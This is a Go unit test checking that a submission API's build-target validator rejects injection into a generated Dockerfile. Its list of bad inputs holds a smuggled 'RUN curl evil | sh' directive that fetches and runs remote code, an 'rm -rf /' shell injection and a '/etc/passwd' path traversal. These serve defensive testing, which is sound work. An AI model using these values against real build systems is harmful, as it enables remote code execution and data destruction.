package validator

import (
	"testing"

	cerrs "github.com/iicpc/submission-api/internal/errors"
)

// TestValidateBuildTargetRejectsInjection reproduces M20: the Go path did no
// charset validation, so a build.target carrying shell/Dockerfile metacharacters
// flowed unescaped into the generated Dockerfile (go build -o {{.Target}}).
func TestValidateBuildTargetRejectsInjection(t *testing.T) {
	bad := []string{
		"app\"\nRUN curl evil | sh", // newline + quote -> inject Dockerfile directive
		"app; rm -rf /",             // shell metacharacters
		"../../etc/passwd",          // path traversal
		"a b",                       // whitespace
		"",                          // empty
	}
	for _, tgt := range bad {
		cfg := &BenchmarkConfig{Language: "go", Build: BuildSection{Type: "go", Target: tgt}}
		if err := validateBuildTarget(cfg, "go.mod", nil); err != cerrs.ErrInvalidBuildTarget {
			t.Errorf("target %q: got err=%v, want ErrInvalidBuildTarget", tgt, err)
		}
	}

	// A clean target still passes the Go path (go.mod requires no further checks).
	ok := &BenchmarkConfig{Language: "go", Build: BuildSection{Type: "go", Target: "my-app_1.bin"}}
	if err := validateBuildTarget(ok, "go.mod", nil); err != nil {
		t.Fatalf("clean Go target rejected: %v", err)
	}
}
